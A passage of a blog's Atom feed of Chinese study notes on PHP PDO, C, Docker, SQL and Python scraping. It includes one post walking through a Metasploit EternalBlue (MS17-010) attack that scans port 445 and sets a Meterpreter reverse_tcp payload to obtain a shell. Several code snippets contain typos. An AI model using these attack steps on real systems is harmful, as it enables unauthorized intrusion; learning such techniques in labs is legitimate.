        &lt;h1 id=&quot;python创建虚拟环境&quot;&gt;&lt;a href=&quot;#python创建虚拟环境&quot; class=&quot;headerlink&quot; title=&quot;python创建虚拟环境&quot;&gt;&lt;/a&gt;python创建虚拟环境&lt;/h1&gt;&lt;pre&gt;&lt;code&gt;使用清华源安装：pip install vi
      
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
  </entry>
  
  <entry>
    <title>php</title>
    <link href="http://yoursite.com/2020/05/25/php/"/>
    <id>http://yoursite.com/2020/05/25/php/</id>
    <published>2020-05-25T13:18:30.000Z</published>
    <updated>2020-05-26T14:06:21.835Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PDO扩展的使用"><a href="#PDO扩展的使用" class="headerlink" title="PDO扩展的使用"></a>PDO扩展的使用</h1><p>使用PDO连接数据库需要先实例化PDO</p><pre><code class="bash"><span class="variable">$DBMS</span>=<span class="string">'mysql'</span>;<span class="variable">$host</span>=<span class="string">'localhost'</span>;<span class="variable">$port</span>=<span class="string">'3306'</span>;<span class="variable">$dname</span>=<span class="string">'name'</span>;<span class="variable">$dsn</span>=<span class="string">"<span class="variable">$DBMS</span>：host=<span class="variable">$host</span>;port=<span class="variable">$port</span>;dbname=<span class="variable">$dbname</span>"</span>;<span class="variable">$options</span>=array(PDO::MYSQL_ATTR_IINIT_COMMAND=&gt;<span class="string">'SET NAMES \'</span>UTF8\<span class="string">''</span>);//设定字符集<span class="variable">$pdo</span>= new PDO(<span class="variable">$dsn</span>,<span class="variable">$user</span>,<span class="variable">$pwd</span>,<span class="variable">$options</span>); </code></pre><h1 id="PDO执行sql语句"><a href="#PDO执行sql语句" class="headerlink" title="PDO执行sql语句"></a>PDO执行sql语句</h1><pre><code class="bash">    query()方法<span class="variable">$pdo</span>= new PDO(……)<span class="variable">$sql</span>=<span class="string">"……"</span>;<span class="variable">$reques</span>=query(<span class="variable">$sql</span>);var_dump(<span class="variable">$reques</span>);//输出受影响的id号<span class="built_in">exec</span>()返回有记录结果的操作 （执行后受影响的行数）</code></pre><h1 id="预处理语句"><a href="#预处理语句" class="headerlink" title="预处理语句"></a>预处理语句</h1><pre><code>预编译可以防止sql注入，避免重复分析 编译问题PDO::PARAM_NULL 代表sql 空 数据类型PDO::PARAM_INT    代表sql 整数 数据类型PDO::PARAM_STR    代表sql 字符串 数据类型PDO::PARAM_LOB    代表sql 大对象 数据类型PDO::PARAM_BOOL    代表sql 布尔值 数据类型</code></pre><pre><code class="bash"><span class="variable">$pdo</span>= new PDO (<span class="string">"……"</span>);<span class="variable">$st</span>=pdo-&gt;prepare(<span class="string">"insert into `tables`(id,name,monry) values (:id,:name,:money)"</span>);//设置变量<span class="variable">$id</span>=<span class="string">"1"</span>,<span class="variable">$name</span>=<span class="string">"nicole"</span>;<span class="variable">$money</span>=<span class="string">"5000"</span>;<span class="variable">$st</span>-&gt;bindParam(<span class="string">":id"</span>,<span class="variable">$id</span>,PDO::PARAM_INT);//bindParam()方法将设置好的变量绑定到相应的占位符上<span class="variable">$st</span>-&gt;bindParam(<span class="string">":name"</span>,<span class="variable">$name</span>,PDO::PARAM_STR);<span class="variable">$st</span>-&gt;bindParam(<span class="string">":money"</span>,<span class="variable">$money</span>,PDO::PARAM_INT);var_dump(<span class="variable">$stmt</span>-&gt;execute());//打印执行结果 执行execute方法插入数据预处理语句处理结果集  fetch()，fethchColumn() fetchAll()</code></pre><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;PDO扩展的使用&quot;&gt;&lt;a href=&quot;#PDO扩展的使用&quot; class=&quot;headerlink&quot; title=&quot;PDO扩展的使用&quot;&gt;&lt;/a&gt;PDO扩展的使用&lt;/h1&gt;&lt;p&gt;使用PDO连接数据库需要先实例化PDO&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;bash
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>ms17-010</title>
    <link href="http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"/>
    <id>http://yoursite.com/2020/05/23/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/</id>
    <published>2020-05-23T09:58:36.000Z</published>
    <updated>2020-06-10T14:09:18.450Z</updated>
    
    <content type="html"><![CDATA[<h1 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h1><a id="more"></a><p><img src="/img/11.jpg" alt="alt 图片"><br><img src="/img/22.jpg" alt="alt 图片"></p><pre><code class="bash">scanner查看扫描模块以syn为例子 use auxiliary/scanner/portscan/syn <span class="built_in">set</span> RHPSTS ip and ports 0-500run 永恒之蓝利用445端口 smb服务 操作系统溢出漏洞</code></pre><h1 id="或者可以使用nmap扫描-nmap-sV-ip地址"><a href="#或者可以使用nmap扫描-nmap-sV-ip地址" class="headerlink" title="或者可以使用nmap扫描 nmap -sV ip地址"></a>或者可以使用nmap扫描 nmap -sV ip地址</h1><h1 id="尝试攻击"><a href="#尝试攻击" class="headerlink" title="尝试攻击"></a>尝试攻击</h1><h2 id="查看漏洞模块"><a href="#查看漏洞模块" class="headerlink" title="查看漏洞模块"></a>查看漏洞模块</h2><p>查看漏洞模块——search ms17-010<br>可以先使用辅助扫描模块测试 use auxiliary/scanner/smb/smb_ms17_010<br>    set payload ：设置payload，这里用set payload windows/x64/meterpreter/reverse_tcp<br>    要选用其他payload可以使用show payloads查看适合要攻击的目标主机的payload<br>    <img src="/img/3.jpg" alt="alt 图片"><br>    ## show options ：使用该命令会列出使用当前模块所需呀配置的参数</p><pre><code>### set RHOST 目标主机地址 ：该命令会设置好要攻击的目标主机地址### set LHOST 攻击机地址 ：该命令设置攻击机的地址，使目标主机回连至攻击机### set LPORT 回连的端口 ：该命令设置目标主机回连至攻击机的端口，默认为4444### run：开始攻击</code></pre><h1 id="使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue"><a href="#使用攻击模块进行攻击-use-exploit-windows-smb-ms17-010-eternalblue" class="headerlink" title="使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue"></a>使用攻击模块进行攻击 use exploit/windows/smb/ms17_010_eternalblue</h1><p><img src="/img/4.jpg" alt="alt 图片"></p><h3 id="成功后会得到一个shell"><a href="#成功后会得到一个shell" class="headerlink" title="成功后会得到一个shell"></a>成功后会得到一个shell</h3><h3 id="到这里漏洞攻击已经成功"><a href="#到这里漏洞攻击已经成功" class="headerlink" title="到这里漏洞攻击已经成功"></a>到这里漏洞攻击已经成功</h3><p> meterpreter汉字乱码问题<br>成因  linux默认是utf-8编码  换成gbk即可</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;信息收集阶段&quot;&gt;&lt;a href=&quot;#信息收集阶段&quot; class=&quot;headerlink&quot; title=&quot;信息收集阶段&quot;&gt;&lt;/a&gt;信息收集阶段&lt;/h1&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>c语言基础</title>
    <link href="http://yoursite.com/2020/04/16/c%E8%AF%AD%E8%A8%80/"/>
    <id>http://yoursite.com/2020/04/16/c%E8%AF%AD%E8%A8%80/</id>
    <published>2020-04-16T10:19:47.000Z</published>
    <updated>2020-05-20T10:50:52.765Z</updated>
    
    <content type="html"><![CDATA[<h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int x,z,y 定义为基本整形</span><br><span class="line">long x,z,t 定义为长整形</span><br><span class="line"><span class="built_in">float</span>单精度 double双精度  long double 长双精度</span><br><span class="line">char字符变量 一般占用1字节内存</span><br></pre></td></tr></table></figure><h3 id="赋值与类型转换"><a href="#赋值与类型转换" class="headerlink" title="赋值与类型转换"></a>赋值与类型转换</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">赋值</span><br><span class="line">int x=5 int x=3 `y=3 </span><br><span class="line">类型自动转换</span><br><span class="line">两边数据类型不同时 将丢失一部分数据 丢失的部分按四舍五入计算</span><br><span class="line">强制转换</span><br><span class="line">（类型说明符）（表达式); (int)(x+y);</span><br><span class="line">结合性的作用是当某几个运算符的优先级相同时决定先执行那个</span><br><span class="line">+（右结合） -*/%（左结合）</span><br><span class="line">在声明变量中不允许连续给多个变量赋值 而赋值语句允许给多个变量赋值</span><br><span class="line">格式化输出 </span><br><span class="line">putchar(c)一次获取一个字符输出</span><br><span class="line">getchar（c）</span><br><span class="line"><span class="built_in">printf</span>（格式控制 ,输出表列） <span class="built_in">print</span>（<span class="string">"%d,%d"</span>,a,b）</span><br><span class="line">格式控制</span><br><span class="line">d格式字符 用来输出十进制整数   %d</span><br><span class="line">%md m为指定输出字段得到宽度 如果数据小于m则左端补空格 若大于m则按实际输出</span><br><span class="line">%ld输出长整形数据</span><br><span class="line">%o 格式字符以八进制形式输出整数  </span><br><span class="line"> %lo %mo</span><br><span class="line"> x格式字符 以十六进制形式输出字符</span><br><span class="line"> c用来输出一个字符</span><br><span class="line"> s输出字符串</span><br><span class="line"> e以指数形式输出实型数据</span><br><span class="line"> g输出实数</span><br><span class="line"> scanf…………………………</span><br></pre></td></tr></table></figure><h3 id="顺序和选择结构"><a href="#顺序和选择结构" class="headerlink" title="顺序和选择结构"></a>顺序和选择结构</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>()</span><br><span class="line">……</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>()</span><br><span class="line">……</span><br><span class="line"><span class="keyword">else</span> ……</span><br><span class="line"></span><br><span class="line">三目运算符 表达式1？语句1：语句2</span><br><span class="line"></span><br><span class="line">switch（表达式）</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> 常量表达式：</span><br><span class="line">语句1；</span><br><span class="line"><span class="built_in">break</span>；</span><br><span class="line"><span class="keyword">case</span> 常量表达式2</span><br><span class="line">语句2;</span><br><span class="line">breakk;</span><br><span class="line">default:</span><br><span class="line">语句n </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>（表达式）&#123; </span><br><span class="line">语句……</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">循环体</span><br><span class="line"><span class="keyword">while</span>（表达式）</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>（表达式1，表达式2，表达式3） 语句</span><br><span class="line"><span class="keyword">for</span>循环使用逗号运算符 实现两个或者以上的变量共同实现对循环的控制</span><br><span class="line"></span><br><span class="line">转移语句 goto <span class="built_in">break</span> <span class="built_in">continue</span></span><br></pre></td></tr></table></figure><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类型说明符 数组名[常量] 数组必须先定义再使用</span><br><span class="line">数组可以不指定长度</span><br><span class="line">字符串要用<span class="string">""</span>引起来</span><br><span class="line">%s格式化输出字符串时 <span class="built_in">printf</span>输出项是字符数组名 不是数组元素名```</span><br></pre></td></tr></table></figure><h3 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">调用一下函数头文件应包含stdio.h</span><br><span class="line">puts（字符数组名） 把字符数组输出到屏幕上</span><br><span class="line">gets（字符数组名） 字符串输入函数</span><br><span class="line">strcat（字符数组1,字符数组2）字符串连接函数</span><br><span class="line">strcpy（字符数组1,字符数组2） 字符复制函数</span><br><span class="line">strcmp（）字符串比较函数 用ascll顺序比较 等于放回0 大于返回正数 小于返回负数</span><br><span class="line">strlwr（）字符串转换为小写字母</span><br><span class="line">strupr（）字符串转换为大写字母</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">函数定义</span><br><span class="line">类型说明符 函数名()</span><br><span class="line">&#123; </span><br><span class="line">声明部分</span><br><span class="line">语句</span><br><span class="line">&#125;</span><br><span class="line">数组名作为函数参数时 应该在主调函数和被调函数中分别定义数组</span><br></pre></td></tr></table></figure><h3 id="库函数"><a href="#库函数" class="headerlink" title="库函数"></a>库函数</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int abs（long x）函数 求绝对值的函数</span><br><span class="line">long labs 长整型绝对值</span><br><span class="line">double labs 浮点数的绝对值</span><br><span class="line">double sin ，cos， tan</span><br><span class="line">指数对数 exp <span class="built_in">log</span> log10</span><br><span class="line">字符函数 使用字符函数时要包含头文件&lt;ctype.h&gt;</span><br><span class="line">int isalphs(int ch)如果ch是字母则返回非零值 否则返回0</span><br><span class="line">int isdigit(int ch)如果ch是数字则返回非零值 否则返回0</span><br><span class="line">int isalnum(int ch)检测字母或者数字</span><br><span class="line">strchr</span><br></pre></td></tr></table></figure><h3 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">一个变量专门用来存放另外一个变量的地址则称为指针变量  定义完指针变量再复制 不要加“*”</span><br><span class="line">类型说明 *变量名 *表示这是一个指针变量</span><br><span class="line">定义指针汴梁复制 </span><br><span class="line">int a;</span><br><span class="line">int *p=&amp;a;</span><br><span class="line">指针变量的引用：*指针变量</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;数据类型&quot;&gt;&lt;a href=&quot;#数据类型&quot; class=&quot;headerlink&quot; title=&quot;数据类型&quot;&gt;&lt;/a&gt;数据类型&lt;/h3&gt;
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>docker</title>
    <link href="http://yoursite.com/2020/04/09/docker/"/>
    <id>http://yoursite.com/2020/04/09/docker/</id>
    <published>2020-04-09T07:54:04.000Z</published>
    <updated>2020-06-10T13:22:21.851Z</updated>
    
    <content type="html"><![CDATA[<h1 id="docker-常用命令"><a href="#docker-常用命令" class="headerlink" title="docker 常用命令"></a>docker 常用命令</h1><a id="more"></a><p>service docker restart #重启docker</p><p> docker images 列出本地镜像</p><ul><li>-q只显示镜像id，-a列出本地所有镜像 –digests显示镜像的摘要信息 –no-trunc显示完整信息<br>docker run 创建一个新的容器并运行</li><li>-it交互式运行  -d后台运行并返回id -p指定端口映射<br>docker search crntos -s 30 列出点赞数超过30的指定镜像<br>docker start 启动一个或者多个停止的容器<br>docker stop停止容器<br>docker rm删除一个或者多个容器 -f<br>docker kill杀死一个容器<br>docker exec在运行的容器中执行命令 -d -i -t<br>docker pull 拉取镜像<br>docker build 创建镜像</li><li>-f指定dockerfile路径 –pull 更新镜像 –network指定run的网络<br>docker commit将容器固化成一个新的镜像<br>docker ps -q -a<br>docker rename 重命名<br>docker cp容器主机之间的数据拷贝</li></ul><h1 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h1><p>docker build -t dockerfile –network=host -t name .<br>docker run -tid –name test –privileged=true ubuntu:18.04 /sbin/init<br>docker exec -it test /bin/bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">FROM 基础镜像 当前新镜像是基于那个镜像</span><br><span class="line">MAINTAINER 镜像维护者的姓名和邮箱</span><br><span class="line">RUN 容器构建时需要运行的命令</span><br><span class="line">EXPOSE 当前容器对外暴露的端口</span><br><span class="line">WORKDIR 指定创建的容器后 终端默认登录进来的工作目录</span><br><span class="line">ENV用来构建镜像过程设置环境变量</span><br><span class="line">ADD在宿主机目录下的文件拷贝进镜像且add命令自动处理url和解压tar压缩包</span><br><span class="line">COPY 源路径的文件、目录复制到新的一层镜像内&lt;目录路径&gt;</span><br><span class="line">VOLUME容器数据卷 用于数据保存和持久化工作</span><br><span class="line">CMD指定一个容器启动时要运行的命令 可以有多个但只有最后一个生效</span><br><span class="line">ENTRYPOINT指定一个容器启动时要运行的命令</span><br><span class="line">ONBUILD当构建一个被继承的dockerfile时运行命令 父镜像咋子被子继承后父镜像的onbuild被触发</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;docker-常用命令&quot;&gt;&lt;a href=&quot;#docker-常用命令&quot; class=&quot;headerlink&quot; title=&quot;docker 常用命令&quot;&gt;&lt;/a&gt;docker 常用命令&lt;/h1&gt;
    
    </summary>
    
    
      <category term="docker" scheme="http://yoursite.com/categories/docker/"/>
    
    
  </entry>
  
  <entry>
    <title>sql</title>
    <link href="http://yoursite.com/2020/04/05/sql/"/>
    <id>http://yoursite.com/2020/04/05/sql/</id>
    <published>2020-04-05T12:34:40.000Z</published>
    <updated>2020-06-08T15:07:54.037Z</updated>
    
    <content type="html"><![CDATA[<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>查看支持的引擎 SHOW ENGINES;<br>建立表:create table table(id int auto_increment primary key,user varchar(10) not null);<br>查看表结构: show columns； || DESCRIBE table_name 列名 ;<br>修改表结构：alter table 数据表名 alter_spec[xx]<br>添加字段 ：alter table name add columns varchar(5) not nuull;<br>修改表名：alter table name rename as new_name;</p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>！=|《》<br>is null is | is not null | in | not in | like | not like<br>x between a and b  判断数据是否在某个访问内 是返回1否返回0；<br>x in (1,2,3……) 判断x是否在里面<br>x regexp ‘匹配方式’ 正则匹配是否包含</p><h3 id="操作表"><a href="#操作表" class="headerlink" title="操作表"></a>操作表</h3><p>插入数据：insert into name values(‘’); || insert ……set<br>更新数据：update table set xx=’xx’;<br>删除数据：delete from name where user=’xx’;<br>删除所有数据:truncate table name;</p><h3 id="数据查询"><a href="#数据查询" class="headerlink" title="数据查询"></a>数据查询</h3><p>limit 限定<br>多表查询用,号分隔<br>聚合函数<br>distinct 去重<br>order by  字段名 【ASC|DESF】升序/降序<br>group by xxx 对结果分组<br>exists 内层查询不返回 而是一个真假值<br>any 只要满足内层的一个<br>all 要内层全部满足 才能执行外层函数<br>union 合并查询结果<br>truncate(x,y)x保留到小数点后y位</p><h3 id="数据备份"><a href="#数据备份" class="headerlink" title="数据备份"></a>数据备份</h3><p>mysqldump -uroot -p test&gt;d://xx.sql<br>mysqldump可以备份一个，多个数据库 备份所有数据库<br>数据还原 mysql -uroot -p [dbname] &lt; xx.sql</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;查看支持的引擎 SHOW ENGINES;&lt;br&gt;建立表:create table table(id int auto_increment primary 
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>py web spider</title>
    <link href="http://yoursite.com/2020/04/04/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"/>
    <id>http://yoursite.com/2020/04/04/%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/</id>
    <published>2020-04-04T11:32:21.000Z</published>
    <updated>2020-06-10T13:24:35.370Z</updated>
    
    <content type="html"><![CDATA[<h1 id="requests库请求"><a href="#requests库请求" class="headerlink" title="requests库请求"></a>requests库请求</h1><a id="more"></a><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get请求a=requests.get(<span class="string">'http://127.0.0.1'</span>)</span><br><span class="line">post请求a=requests.post(<span class="string">'https://127.0.0.1'</span>,data=&#123;<span class="string">'key'</span>:<span class="string">'vaule'</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="请求头伪装"><a href="#请求头伪装" class="headerlink" title="请求头伪装"></a>请求头伪装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">headers=&#123;<span class="string">'user-agent'</span>:<span class="string">'xxxxx'</span>&#125;</span><br><span class="line">a=requests.get(url,headers=headers)</span><br></pre></td></tr></table></figure><h3 id="BeautifulSoup"><a href="#BeautifulSoup" class="headerlink" title="BeautifulSoup"></a>BeautifulSoup</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=BeautifulSoup(html,<span class="string">'lxml'</span>)</span><br><span class="line">获取标题内容:a.soup.title.string</span><br><span class="line">获取a标签的内容:a.p.string</span><br><span class="line">获取所有a标签：a.find_all(<span class="string">'a'</span>)</span><br><span class="line">获取id为xxx的标签：a.find(id=<span class="string">"xxx"</span>)</span><br></pre></td></tr></table></figure><h3 id="xpath表达式"><a href="#xpath表达式" class="headerlink" title="xpath表达式"></a>xpath表达式</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install lxml</span><br><span class="line">import lxml </span><br><span class="line">a=html.xpath(<span class="string">'//div[@class="text"]/h2/a/'</span>)</span><br><span class="line">/       <span class="comment"># 逐层提取s</span></span><br><span class="line">text（）<span class="comment">#提取标签下面的文本</span></span><br><span class="line">//标签名**提取所有标签为**的标签</span><br><span class="line">//标签名[@属性=<span class="string">'属性值'</span>]<span class="comment">#提取所有属性为属性值的标签</span></span><br><span class="line">@属性名 <span class="comment">#代表取某个人属性值</span></span><br></pre></td></tr></table></figure><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">f=open(<span class="string">'文件路径'</span>，<span class="string">'w文件操作方式'</span>)</span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line">with open(<span class="string">'文件路径'</span>，<span class="string">'操作方式'</span>) as f:</span><br><span class="line">对文件进行的操作</span><br><span class="line">f.readlines() <span class="comment">#  按行读取</span></span><br><span class="line">f.write(<span class="string">"一大段文字"</span>)<span class="comment">#文件写入</span></span><br></pre></td></tr></table></figure><h3 id="multiprocessing"><a href="#multiprocessing" class="headerlink" title="multiprocessing"></a>multiprocessing</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">multiprocessing下有个dummy模块下有个pool类</span><br><span class="line">from multiprocessing.dummy import Pool</span><br><span class="line">def qu(url):</span><br><span class="line">requests.get(url)</span><br><span class="line">url=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(100):</span><br><span class="line">url.appned(<span class="string">"http://127.0.0.1"</span>)</span><br><span class="line">pool=pool(5)</span><br><span class="line">pool.map(qu,url)</span><br><span class="line">map()<span class="comment">#方法接受两个参数 第一个是函数名字 2是迭代对象</span></span><br></pre></td></tr></table></figure><h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br><span class="line">import redis</span><br><span class="line">c=redis.StrictRedis(host=<span class="string">'127.0.0.1'</span>,port=2739,password=<span class="string">'12345'</span>)<span class="comment">#连接redis</span></span><br><span class="line">c.lpush(<span class="string">'chapter_6'</span>,123)<span class="comment">#把123放到chapter_6列表的左侧</span></span><br><span class="line">v=c.lpop(<span class="string">'chapter_6'</span>)<span class="comment">#在列表左侧读取一个值</span></span><br><span class="line">c.sadd(<span class="string">'test'</span>,<span class="string">'www.baidu.com'</span>)<span class="comment">#往集合添加一个网址</span></span><br><span class="line">url=c.spop(<span class="string">'url'</span>)<span class="comment">#从集合读取一个值</span></span><br><span class="line">length=c.scard(<span class="string">'url'</span>)<span class="comment">#查看集合长度</span></span><br></pre></td></tr></table></figure><p>###</p><pre><code class="bash"></code></pre><p>###<br>###<br>###<br>###<br>###</p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;requests库请求&quot;&gt;&lt;a href=&quot;#requests库请求&quot; class=&quot;headerlink&quot; title=&quot;requests库请求&quot;&gt;&lt;/a&gt;requests库请求&lt;/h1&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
  </entry>
  
  <entry>
    <title>Get up keep moving</title>
    <link href="http://yoursite.com/2020/03/30/hello-world/"/>
    <id>http://yoursite.com/2020/03/30/hello-world/</id>
    <published>2020-03-30T00:37:02.968Z</published>
    <updated>2020-04-09T08:34:21.251Z</updated>
    
    <content type="html"><![CDATA[<p>Life moves pretty fast. If you don’t stop and look around once in a while,you could miss it<br><img src="/img/1.jpg" alt="alt 图片"></p><h3 id="For-what-it’s-worth-it’s-never-too-late"><a href="#For-what-it’s-worth-it’s-never-too-late" class="headerlink" title="For what it’s worth it’s never too late"></a>For what it’s worth it’s never too late</h3><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><a id="more"></a><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" 